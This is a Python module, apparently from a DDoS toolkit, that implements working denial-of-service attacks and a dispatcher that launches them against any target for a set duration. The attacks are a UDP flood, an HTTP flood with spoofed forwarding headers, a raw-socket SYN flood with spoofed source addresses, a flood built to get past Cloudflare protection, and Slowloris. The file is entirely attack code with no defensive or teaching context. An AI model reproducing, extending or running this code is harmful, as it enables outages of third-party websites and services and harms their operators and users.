# attack_methods.py
import time
import socket
import random
import threading
import ssl
import struct
import requests
from urllib.parse import urlparse
import dns.resolver
import socks
import cloudscraper

# Global variables for user-agent rotation and proxy lists
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
]

PROXY_LIST = []  # Populate with proxy servers if available

def resolve_target(target):
    """Resolve a target (URL or IP) to IP address and port"""
    try:
        # If it's already an IP:port format
        if ":" in target and not target.startswith("http"):
            parts = target.split(":")
            if len(parts) == 2:
                return parts[0], int(parts[1])
        
        # Parse URL if it starts with http/https
        if target.startswith("http"):
            parsed = urlparse(target)
            hostname = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
        else:
            # Assume it's a domain without scheme
            hostname = target
            port = 80  # Default to port 80
        
        # Resolve hostname to IP
        ip = socket.gethostbyname(hostname)
        return ip, port
    except Exception as e:
        raise ValueError(f"Could not resolve target: {target} - {str(e)}")

def attack_udp_god(target, duration):
    """Enhanced UDP flood with more threads and larger packets"""
    ip, port = resolve_target(target)
    
    threads_count = 50  # Increased thread count
    packet_size = 1450  # Maximum without fragmentation
    
    def flood():
        data = random._urandom(packet_size)
        end_time = time.time() + duration
        
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                
                # Send multiple packets per connection
                for _ in range(100):  # Send 100 packets per socket
                    if time.time() >= end_time:
                        break
                    s.sendto(data, (ip, port))
                s.close()
            except:
                try:
                    s.close()
                except:
                    pass
                time.sleep(0.01)
    
    # Start threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Wait for duration
    time.sleep(duration)
    for t in threads:
        try:
            t.join(0.1)
        except:
            pass

def attack_http_flood(target, duration):
    """Enhanced HTTP flood with more sophisticated techniques"""
    ip, port = resolve_target(target)
    use_ssl = port == 443
    
    threads_count = 500  # Increased thread count
    
    # Enhanced headers and paths
    paths = [
        "/", "/wp-admin.php", "/admin/login", "/api/v1/users",
        "/search", "/checkout", "/cart", "/product/123",
        "/user/profile", "/ajax/search", "/graphql", "/wp-json/wp/v2/posts"
    ]
    
    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "TRACE", "PATCH"]
    
    def build_request(target_ip):
        method = random.choice(methods)
        path = random.choice(paths)
        
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {target_ip}",
            f"User-Agent: {random.choice(USER_AGENTS)}",
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            f"Accept-Language: en-US,en;q=0.5",
            f"Accept-Encoding: gzip, deflate, br",
            f"Cache-Control: no-cache",
            f"X-Forwarded-For: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
            f"X-Real-IP: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
            f"Connection: keep-alive",
            f"Upgrade-Insecure-Requests: 1",
        ]
        
        if method == "POST":
            headers.extend([
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {random.randint(100, 2000)}"
            ])
        
        return "\r\n".join(headers) + "\r\n\r\n"
    
    def flood():
        end_time = time.time() + duration
        sock = None
        
        while time.time() < end_time:
            try:
                if sock is None:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    if use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=ip)
                    
                    sock.connect((ip, port))
                
                request = build_request(ip)
                sock.sendall(request.encode())
                
                # Keep connection alive for multiple requests
                for _ in range(random.randint(1, 10)):
                    if time.time() >= end_time:
                        break
                    request = build_request(ip)
                    sock.sendall(request.encode())
                    time.sleep(0.01)
                    
            except Exception as e:
                try:
                    if sock:
                        sock.close()
                except:
                    pass
                sock = None
                time.sleep(0.1)
    
    # Start threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Wait for duration
    time.sleep(duration)
    for t in threads:
        try:
            t.join(0.1)
        except:
            pass

def attack_tcp_syn(target, duration):
    """Powerful TCP SYN flood attack"""
    ip, port = resolve_target(target)
    
    threads_count = 25  # Increased thread count
    
    def syn_flood():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Craft IP header
                source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
                dest_ip = socket.inet_aton(ip)
                
                # IP header
                ip_ver_ihl = 0x45
                ip_tos = 0
                ip_tot_len = 0
                ip_id = random.randint(1, 65535)
                ip_frag_off = 0
                ip_ttl = 255
                ip_proto = socket.IPPROTO_TCP
                ip_check = 0
                ip_saddr = socket.inet_aton(source_ip)
                ip_daddr = dest_ip
                
                ip_header = struct.pack('!BBHHHBBH4s4s',
                                       ip_ver_ihl, ip_tos, ip_tot_len, ip_id,
                                       ip_frag_off, ip_ttl, ip_proto, ip_check,
                                       ip_saddr, ip_daddr)
                
                # TCP header
                source_port = random.randint(1024, 65535)
                dest_port = port
                seq = random.randint(0, 4294967295)
                ack_seq = 0
                doff = 5
                fin, syn, rst, psh, ack, urg = 0, 1, 0, 0, 0, 0
                tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
                window = socket.htons(5840)
                check = 0
                urg_ptr = 0
                
                tcp_offset = (doff << 4)
                tcp_header = struct.pack('!HHLLBBHHH',
                                        source_port, dest_port, seq, ack_seq,
                                        tcp_offset, tcp_flags, window, check, urg_ptr)
                
                # Send multiple packets
                for _ in range(10):
                    if time.time() >= end_time:
                        break
                    s.sendto(ip_header + tcp_header, (ip, 0))
                s.close()
                
            except Exception as e:
                try:
                    s.close()
                except:
                    pass
    
    # Start threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=syn_flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    time.sleep(duration)
    for t in threads:
        try:
            t.join(0.1)
        except:
            pass

def attack_cloudflare_bypass(target, duration):
    """Advanced Cloudflare bypass using various techniques"""
    # Extract hostname from URL if needed
    if target.startswith("http"):
        parsed = urlparse(target)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        url = target
    else:
        hostname = target
        port = 80
        url = f"http://{target}"
    
    threads_count = 100  # Increased thread count
    
    def bypass_attack():
        end_time = time.time() + duration
        scraper = cloudscraper.create_scraper()
        
        while time.time() < end_time:
            try:
                # Rotate user agents
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0',
                    'TE': 'Trailers',
                }
                
                # Add various headers to mimic real browser
                if random.random() > 0.5:
                    headers['X-Forwarded-For'] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                
                # Make request with cloudscraper to bypass basic protection
                response = scraper.get(url, headers=headers, timeout=5)
                
                # If we get a challenge, try to solve it
                if response.status_code == 403 or "cloudflare" in response.text.lower():
                    # Additional bypass techniques
                    time.sleep(2)  # Wait before retrying
                    continue
                    
            except Exception as e:
                pass
    
    # Start threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=bypass_attack)
        t.daemon = True
        threads.append(t)
        t.start()
    
    time.sleep(duration)
    for t in threads:
        try:
            t.join(0.1)
        except:
            pass

def attack_slowloris(target, duration):
    """Advanced Slowloris attack with more connections"""
    ip, port = resolve_target(target)
    use_ssl = port == 443
    
    sockets_count = 1000  # Increased socket count
    sockets = []
    
    # Create initial sockets
    for _ in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=ip)
            
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
            sockets.append(s)
        except:
            pass
    
    end_time = time.time() + duration
    
    # Keep connections alive
    while time.time() < end_time:
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except:
                try:
                    s.close()
                    sockets.remove(s)
                    # Try to create a new socket
                    try:
                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_s.settimeout(2)
                        
                        if use_ssl:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            new_s = context.wrap_socket(new_s, server_hostname=ip)
                        
                        new_s.connect((ip, port))
                        new_s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
                        sockets.append(new_s)
                    except:
                        pass
                except:
                    pass
        time.sleep(15)  # Send keep-alive headers every 15 seconds
    
    # Clean up
    for s in sockets:
        try:
            s.close()
        except:
            pass

# Attack dispatcher for easy calling
ATTACK_METHODS = {
    "udp": attack_udp_god,
    "http": attack_http_flood,
    "syn": attack_tcp_syn,
    "cloudflare": attack_cloudflare_bypass,
    "slowloris": attack_slowloris,
}

def launch_attack(method, target, duration):
    """Launch an attack with the specified method"""
    if method in ATTACK_METHODS:
        print(f"Starting {method} attack on {target} for {duration} seconds")
        ATTACK_METHODS[method](target, duration)
        print(f"{method} attack on {target} completed")
    else:
        print(f"Unknown attack method: {method}")
